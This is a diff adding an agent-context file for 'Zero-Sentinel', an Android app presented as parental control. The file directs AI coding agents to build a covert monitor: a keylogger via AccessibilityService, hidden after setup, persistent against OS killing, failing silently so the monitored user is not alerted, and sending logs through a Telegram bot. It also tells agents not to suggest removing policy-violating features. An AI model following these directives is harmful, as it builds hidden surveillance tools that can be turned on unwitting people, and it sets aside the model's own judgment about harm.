@@ -1,0 +1,47 @@
+# CyperBot (Zero-Sentinel) Agent Context
+
+This document defines the context, rules, and architectural constraints for AI agents working on the **Zero-Sentinel** project.
+
+## Project Identity
+*   **Name**: Zero-Sentinel (Internal: CyperBot)
+*   **Type**: Android Parental Control / Monitoring Agent.
+*   **Philosophy**: Zero-Knowledge Privacy, Side-Loaded Distribution, Stealth Operation.
+*   **Target OS**: Android 8.0 (Oreo) to Android 14 (Upside Down Cake).
+
+## Technical Stack
+*   **Language**: Kotlin (Strict typing, Coroutines).
+*   **Build System**: Gradle functionality (Kotlin DSL recommended).
+*   **Architecture**: MVVM (Model-View-ViewModel) with Clean Architecture principles.
+*   **Database**: Room (SQLite) with Write-Ahead Logging (WAL).
+*   **Networking**: OkHttp (Long-polling implementation).
+*   **Cryptography**: `javax.crypto` (AES-GCM) + `java.security` (RSA-OAEP).
+
+## Critical Constraints (Directives)
+1.  **No Google Play Compliance**: We deliberately violate Play Store policies regarding `AccessibilityService` and `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`. Do **NOT** suggest removing features to comply with store rules.
+2.  **Stealth First**: Any UI element added must have a purpose for the *setup phase* only. After setup, the app must be invisible (Headless).
+3.  **Persistence is Paramount**: The app must survive aggressive OS memory killing. Use `START_STICKY`, `ForegroundService`, and `WorkManager` aggressively.
+4.  **Zero-Knowledge**: Never transmit plaintext logs. Always encrypt locally before network transmission.
+
+## Code Style & Standards
+*   **Language**: English only for code, comments, and documentation.
+*   **Logs**: Use structured logging. **NEVER** log sensitive captured user data (keystrokes) to Logcat in Release builds.
+*   **Error Handling**: Fail silently in background services to avoid alerting the user (child). Reschedule, don't crash.
+
+## Development Workflow
+*   **Branching**: `master` is the source of truth. Feature branches should be merged via PR (if applicable) or direct push for solo dev.
+*   **Commits**: Semantic messages (e.g., `feat: add keylogger`, `fix: stealth mode crash`).
+*   **Deployment**: GitHub Actions builds the Release APK.
+
+## File Structure Overview
+```text
+app/src/main/
+├── java/com/zero/sentinel/
+│   ├── services/      # Accessibility, Foreground, and Job Services
+│   ├── receivers/     # Boot, DeviceAdmin receivers
+│   ├── ui/            # Onboarding Wizard Activities
+│   ├── data/          # Room DB, Repositories
+│   ├── crypto/        # Encryption Utilities
+│   └── network/       # Telegram Bot API Client
+├── res/               # Android Resources (Layouts, Strings)
+└── AndroidManifest.xml
+```
